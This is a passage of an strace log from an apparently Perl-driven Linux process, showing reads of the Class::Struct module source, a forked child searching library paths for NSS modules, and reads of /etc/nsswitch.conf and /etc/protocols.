(\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
8463  07:23:33.169197 _llseek(10, 6916, [6916], SEEK_SET) = 0
8463  07:23:33.169197 _llseek(10, 0, [6916], SEEK_CUR) = 0
8463  07:23:33.169198 close(10)         = 0
8463  07:23:33.169364 _llseek(8, 1334, [1334], SEEK_SET) = 0
8463  07:23:33.182994 _llseek(8, 0, [1334], SEEK_CUR) = 0
8463  07:23:33.182994 close(8)          = 0
8463  07:23:33.183526 brk(0x82ff000)    = 0x82ff000
8463  07:23:33.183673 _llseek(6, 2689, [2689], SEEK_SET) = 0
8463  07:23:33.193552 _llseek(6, 0, [2689], SEEK_CUR) = 0
8463  07:23:33.193615 close(6)          = 0
8463  07:23:33.193809 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d97908) = 8464
8464  07:23:33.193916 getppid()         = 8463
8464  07:23:33.194414 open("/etc/nsswitch.conf", O_RDONLY) = 6
8464  07:23:33.194438 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
8464  07:23:33.194457 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f5d000
8464  07:23:33.194471 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
8464  07:23:33.194530 read(6, "", 4096) = 0
8464  07:23:33.194569 close(6)          = 0
8464  07:23:33.194579 munmap(0xb7f5d000, 4096) = 0
8464  07:23:33.194624 open("/etc/ld.so.cache", O_RDONLY) = 6
8464  07:23:33.194638 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8464  07:23:33.194655 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d64000
8464  07:23:33.194666 close(6)          = 0
8464  07:23:33.194677 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8464  07:23:33.194694 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.194710 stat64("/lib/tls/i686/sse2/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.194725 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.194738 stat64("/lib/tls/i686/sse2", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.194749 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.194762 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8464  07:23:33.194779 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.194792 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8464  07:23:33.194808 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.194821 stat64("/lib/tls/sse2/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.194839 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.194851 stat64("/lib/tls/sse2", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.194862 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.194874 stat64("/lib/tls/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.194884 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.194896 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8464  07:23:33.194912 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.194925 stat64("/lib/i686/sse2/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.194936 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.194948 stat64("/lib/i686/sse2", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.194958 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.194970 stat64("/lib/i686/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.194981 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.194992 stat64("/lib/i686", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.195003 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203014 stat64("/lib/sse2/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203014 open("/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203015 stat64("/lib/sse2", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203015 open("/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203015 stat64("/lib/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203015 open("/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203016 stat64("/lib", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8464  07:23:33.203016 open("/usr/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203016 stat64("/usr/lib/tls/i686/sse2/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203016 open("/usr/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203024 stat64("/usr/lib/tls/i686/sse2", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203036 open("/usr/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203049 stat64("/usr/lib/tls/i686/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203060 open("/usr/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203073 stat64("/usr/lib/tls/i686", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203084 open("/usr/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203096 stat64("/usr/lib/tls/sse2/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203107 open("/usr/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203120 stat64("/usr/lib/tls/sse2", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203131 open("/usr/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203143 stat64("/usr/lib/tls/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203154 open("/usr/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203166 stat64("/usr/lib/tls", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203176 open("/usr/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203193 stat64("/usr/lib/i686/sse2/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203205 open("/usr/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203218 stat64("/usr/lib/i686/sse2", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203238 open("/usr/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203254 stat64("/usr/lib/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8464  07:23:33.203317 open("/usr/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203346 stat64("/usr/lib/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8464  07:23:33.203363 open("/usr/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203375 stat64("/usr/lib/sse2/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203386 open("/usr/lib/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203398 stat64("/usr/lib/sse2", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203409 open("/usr/lib/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203421 stat64("/usr/lib/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203432 open("/usr/lib/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203443 stat64("/usr/lib", {st_mode=S_IFDIR|0755, st_size=32768, ...}) = 0
8464  07:23:33.203460 open("/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203474 stat64("/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203486 open("/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203499 stat64("/lib/i486-linux-gnu/tls/i686/sse2", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203512 open("/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203525 stat64("/lib/i486-linux-gnu/tls/i686/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203537 open("/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203549 stat64("/lib/i486-linux-gnu/tls/i686", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203561 open("/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203574 stat64("/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203586 open("/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203599 stat64("/lib/i486-linux-gnu/tls/sse2", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203610 open("/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203623 stat64("/lib/i486-linux-gnu/tls/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203635 open("/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203647 stat64("/lib/i486-linux-gnu/tls", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203658 open("/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203672 stat64("/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203684 open("/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203697 stat64("/lib/i486-linux-gnu/i686/sse2", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203708 open("/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203724 stat64("/lib/i486-linux-gnu/i686/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203745 open("/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203783 stat64("/lib/i486-linux-gnu/i686", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203812 open("/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203858 stat64("/lib/i486-linux-gnu/sse2/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203871 open("/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203884 stat64("/lib/i486-linux-gnu/sse2", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203896 open("/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203909 stat64("/lib/i486-linux-gnu/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203921 open("/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203933 stat64("/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8464  07:23:33.203964 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.203978 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.203991 open("/usr/lib/i486-linux-gnu/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.204005 stat64("/usr/lib/i486-linux-gnu/tls/i686/sse2", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.204017 open("/usr/lib/i486-linux-gnu/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.204031 stat64("/usr/lib/i486-linux-gnu/tls/i686/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.204043 open("/usr/lib/i486-linux-gnu/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.204056 stat64("/usr/lib/i486-linux-gnu/tls/i686", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.204068 open("/usr/lib/i486-linux-gnu/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.204082 stat64("/usr/lib/i486-linux-gnu/tls/sse2/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.204094 open("/usr/lib/i486-linux-gnu/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.204107 stat64("/usr/lib/i486-linux-gnu/tls/sse2", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.204120 open("/usr/lib/i486-linux-gnu/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.204132 stat64("/usr/lib/i486-linux-gnu/tls/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.204145 open("/usr/lib/i486-linux-gnu/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.204157 stat64("/usr/lib/i486-linux-gnu/tls", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.204169 open("/usr/lib/i486-linux-gnu/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.204182 stat64("/usr/lib/i486-linux-gnu/i686/sse2/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.204195 open("/usr/lib/i486-linux-gnu/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.204208 stat64("/usr/lib/i486-linux-gnu/i686/sse2", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.204220 open("/usr/lib/i486-linux-gnu/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.204242 stat64("/usr/lib/i486-linux-gnu/i686/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.204282 open("/usr/lib/i486-linux-gnu/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.204315 stat64("/usr/lib/i486-linux-gnu/i686", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.204327 open("/usr/lib/i486-linux-gnu/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.204340 stat64("/usr/lib/i486-linux-gnu/sse2/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.204353 open("/usr/lib/i486-linux-gnu/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.204366 stat64("/usr/lib/i486-linux-gnu/sse2", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.204378 open("/usr/lib/i486-linux-gnu/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.204390 stat64("/usr/lib/i486-linux-gnu/cmov", 0xbfbb304c) = -1 ENOENT (No such file or directory)
8464  07:23:33.204402 open("/usr/lib/i486-linux-gnu/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
8464  07:23:33.204415 stat64("/usr/lib/i486-linux-gnu", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
8464  07:23:33.204435 munmap(0xb7d64000, 29913) = 0
8464  07:23:33.204457 open("/etc/ld.so.cache", O_RDONLY) = 6
8464  07:23:33.204469 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
8464  07:23:33.204485 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7d64000
8464  07:23:33.204496 close(6)          = 0
8464  07:23:33.204507 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
8464  07:23:33.204522 open("/lib/tls/i686/cmov/libnss_files.so.2", O_RDONLY) = 6
8464  07:23:33.204537 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\340\30\0\0004\0\0\0\254\221\0\0\0\0\0\0004\0 \0\10\0(\0\34\0\33\0\6\0\0\0004\0\0\0004\0\0\0004\0\0\0\0\1\0\0\0\1\0\0\5\0\0\0\4\0\0\0\3\0\0\0\330\206\0\0\330\206\0\0\330\206\0\0\23\0\0\0\23\0\0\0\4\0\0\0\1\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\240\213\0\0\240\213\0\0\5\0\0\0\0\20\0\0\1\0\0\0\350\216\0\0\350\236\0\0\350\236\0\0\314\1\0\0\260\3\0\0\6\0\0\0\0\20\0\0\2\0\0\0\374\216\0\0\374\236\0\0\374\236\0\0\340\0\0\0\340\0\0\0\6\0\0\0\4\0\0\0\4\0\0\0004\1\0\0004\1\0\0004\1\0\0 \0\0\0 \0\0\0\4\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0R\345td\350\216\0\0\350\236\0\0\350\236\0\0\f\1\0\0\f\1\0\0\4\0\0\0\1\0\0\0\4\0\0\0\20\0\0\0\1\0\0\0GNU\0\0\0\0\0\2\0\0\0\6\0\0\0\10\0\0\0k\0\0\0.\0\0\0\20\0\0\0\t\0\0\0\"F\340\24\240\240\245\1\31\10\200\20\203\6\212\10\0\0\222@]\1(\nx\10 \"\220\200\20,\5\1\204\4)!\0224\0\24\0\31\0\0\2\2\210@\0\200@0\210\201@@\200\0B\0\6\300.\0\0\0\0\0\0\0\0\0\0\0/\0\0\0000\0\0\0001\0\0\0002\0\0\0003\0\0\0\0\0\0\0004\0\0\0\0\0\0\0005\0\0\0007\0\0\0008\0\0\0\0\0\0\0:\0\0\0\0\0\0\0;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
8464  07:23:33.204626 fstat64(6, {st_mode=S_IFREG|0644, st_size=38412, ...}) = 0
8464  07:23:33.204647 mmap2(NULL, 41624, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7d59000
8464  07:23:33.204659 mmap2(0xb7d62000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x8) = 0xb7d62000
8464  07:23:33.204676 close(6)          = 0
8464  07:23:33.204699 munmap(0xb7d64000, 29913) = 0
8464  07:23:33.204716 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
8464  07:23:33.204742 fcntl64(6, F_GETFD) = 0x1 (flags FD_CLOEXEC)
8464  07:23:33.204799 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
8464  07:23:33.204816 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d6b000
8464  07:23:33.204828 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
8464  07:23:33.205028 close(6)          = 0
8464  07:23:33.205039 munmap(0xb7d6b000, 4096) = 0
8464  07:23:33.205057 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
8464  07:23:33.205071 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
8464  07:23:33.205087 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d6b000
8464  07:23:33.205098 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 